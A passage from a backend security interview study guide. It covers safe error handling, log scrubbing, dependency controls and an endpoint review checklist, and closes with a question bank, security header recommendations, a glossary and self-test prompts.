    { "error": "Something went wrong", "request_id": "0f9a2c" }

  ✓ WHAT YOU RECEIVE, IN YOUR LOGS
    the entire stack trace, keyed by that same request_id
```

Every detail in the first block shortens the attacker's reconnaissance. Version
numbers select an exploit; paths reveal your framework; a schema name tells them
what to ask for next.

:::do The production posture
- ++Generic message to the client, full detail to your logs++, correlated by a
  request id you also show the user so support can find it.
- ++`NODE_ENV=production`++, `DEBUG=False`, and verify it in the deployed
  environment rather than assuming. Django's debug page and Flask's console
  have both been found live in production more than once.
- ++Remove version banners++ and `X-Powered-By`.
- ++Do not leak in timing or wording++: "user not found" and "wrong password"
  must be one message with one shape.
:::

## 28. What you must not log

Logs are the place where security-conscious teams quietly recreate the problem
they just solved.

| Never log | Because |
|---|---|
| Passwords, even wrong ones | A typo'd password is usually a real one |
| Session ids, JWTs, API keys | Your log store is now credential storage |
| Full card numbers, national ids | Compliance, and it will be exported |
| Whole request bodies on error | The login body is a request body |
| Authorization headers | The most commonly leaked secret in logs |

:::do Treat the log pipeline as a system with its own access control
Scrub at the logger, with an allowlist of fields rather than a blocklist of
secrets. Remember that ==error reporters capture more than your logger does==:
Sentry and its equivalents attach request bodies, headers and local variables
by default, so configure the scrubbing there too. And apply retention: a log you
no longer have cannot leak.
:::

## 29. Dependencies

Not in the lecture, and worth having, because most of the code you ship is not
yours.

```text
  your code            ~5,000 lines you reviewed
  node_modules         ~200,000 lines you did not
                       from ~1,200 maintainers you have never met
                       any of whom can push a new version tonight
```

:::do The realistic controls
- ++Lockfiles committed++, and `npm ci` / `pip install -r` in CI, so the build
  is the versions you tested.
- ++Automated updates++ (Dependabot, Renovate) so patching is routine rather
  than a project. ==Most breaches through dependencies use a fix that was
  available for months.==
- ++Audit in CI++ and fail on high severity, with a documented exception path
  so it does not become noise everyone mutes.
- ++Pin your CI actions to a SHA++, not a tag. A tag can be moved.
- ++Be suspicious of new, tiny, single-maintainer packages++ in the critical
  path, and of typo-adjacent names.
:::

:::part VII | The interview itself

Security questions are usually not "list the OWASP top ten". They are "here is
an endpoint, what is wrong with it", and they reward method over recall.
:::

## 30. Reviewing an endpoint

A repeatable pass. Run it out loud, in this order, and you will find things.

```text
  1. WHAT CROSSES A BOUNDARY?
     every parameter, body field, header, cookie, uploaded file,
     and anything read back out of the database that was once input

  2. WHAT PARSES IT DOWNSTREAM?
     SQL? a shell? HTML in a browser? a template? a path? a log?

  3. WHO IS THE CALLER, AND HOW DO I KNOW?
     session or token, verified how, and can it be replayed?

  4. WHAT MAY THIS CALLER TOUCH?
     is the ownership check in the query, or upstream of it?

  5. WHAT DOES THE RESPONSE REVEAL?
     status codes, timing, error text, fields nobody asked for

  6. WHAT HAPPENS ON THE THOUSANDTH ATTEMPT?
     rate limits, lockouts, and what they cost a real user

  7. WHAT DOES IT WRITE DOWN?
     logs, audit trail, error reporter
```

## 31. Follow-up question bank

| Question | Section |
|---|---|
| What is the one question an attacker asks? | 1 |
| Why is injection not a database problem? | 2, 3 |
| Escaping quotes stops SQL injection. True? | 4 |
| How does a parameterised query actually work? | 5 |
| I use Mongo. Am I safe from injection? | 6 |
| How do you shell out safely? | 7, 8 |
| Why not encrypt passwords instead of hashing? | 10 |
| What is a rainbow table, and what defeats it? | 11, 12 |
| Why is a fast hash the wrong hash? | 11 |
| What does a salt do, and is it secret? | 12 |
| Where do you store a session token, and why not localStorage? | 13, 14 |
| Name the cookie flags and what each prevents | 14 |
| JWT or server session? | 15 |
| Why does IP rate limiting fail? | 16 |
| Role check passed and the user read someone else's row. How? | 17 |
| What is IDOR, and do UUIDs fix it? | 18 |
| 403 or 404, and why? | 19 |
| What happens when someone forgets the auth rule on a new route? | 20 |
| What can an XSS payload do that a network attacker cannot? | 22 |
| What does CSP buy you that escaping does not? | 23 |
| Does CORS prevent CSRF? | 24 |
| A secret was committed. What is the first thing you do? | 26 |
| What is wrong with returning the stack trace? | 27 |

:::part VIII | Appendices
:::

## Appendix A. The response headers

| Header | Value | Stops |
|---|---|---|
| `Content-Security-Policy` | `default-src 'self'; object-src 'none'; frame-ancestors 'none'` | XSS execution, clickjacking |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Downgrade to HTTP |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing a text file into a script |
| `X-Frame-Options` | `DENY` | Clickjacking, legacy clients |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Leaking ids and tokens in URLs |
| `Set-Cookie` | `HttpOnly; Secure; SameSite=Lax` | Theft by XSS, plaintext, CSRF |
| `Cache-Control` | `no-store` on authenticated responses | Private data in shared caches |

## Appendix B. Glossary

| Term | Meaning |
|---|---|
| Injection | Data supplied by a user gets parsed as instructions |
| Parameterised query | Statement and values sent on separate channels |
| Argument array | Executing a program directly, with no shell to parse |
| Hash | One-way, deterministic, fixed-length. Not encryption |
| Rainbow table | Precomputed hash-to-password lookup |
| Salt | Unique random value per password. Not secret |
| Pepper | Secret value outside the database, mixed into the hash |
| Session id | Opaque bearer token mapping to server-side state |
| `HttpOnly` | Cookie flag: JavaScript cannot read it |
| `SameSite` | Cookie flag: not sent on cross-site requests |
| JWT | Signed, ==readable==, self-contained token. Hard to revoke |
| Refresh token | Long-lived, revocable, exchanged for short access tokens |
| BOLA / IDOR | Accessing another user's object by changing an id |
| Deny by default | Forbidden unless a rule permits. Fails closed |
| XSS | Attacker script running in your origin |
| CSP | Policy telling the browser what it may execute |
| CSRF | A forged request carrying a genuine session |
| CORS | Browser policy on reading cross-origin responses. Not a server control |
| Clickjacking | Your UI framed invisibly under the attacker's |
| Audit log | Append-only record of who did what to which object |

## Appendix C. Self-test

Close the book.

:::recall Draw the four language boundaries your backend writes into, and name the injection at each. | 7
:::

:::recall Rewrite an unsafe query and an unsafe shell call, and say why each fix works. | 7
:::

:::recall The password pipeline: what you store, in what form, with what parameters. | 7
:::

:::recall Every cookie flag, and the attack each one prevents. | 6
:::

:::recall Stateful sessions versus JWTs: four differences, and when you would choose each. | 7
:::

:::recall Where does the ownership check belong, and how do you make the unsafe call unwriteable? | 6
:::

:::recall XSS, CSRF and CORS: one sentence each, and which is not a defence. | 6
:::

:::redraw One endpoint from your own product, with every boundary marked and every assumption written next to it. | Then run the seven-step review from section 30 against it.
:::
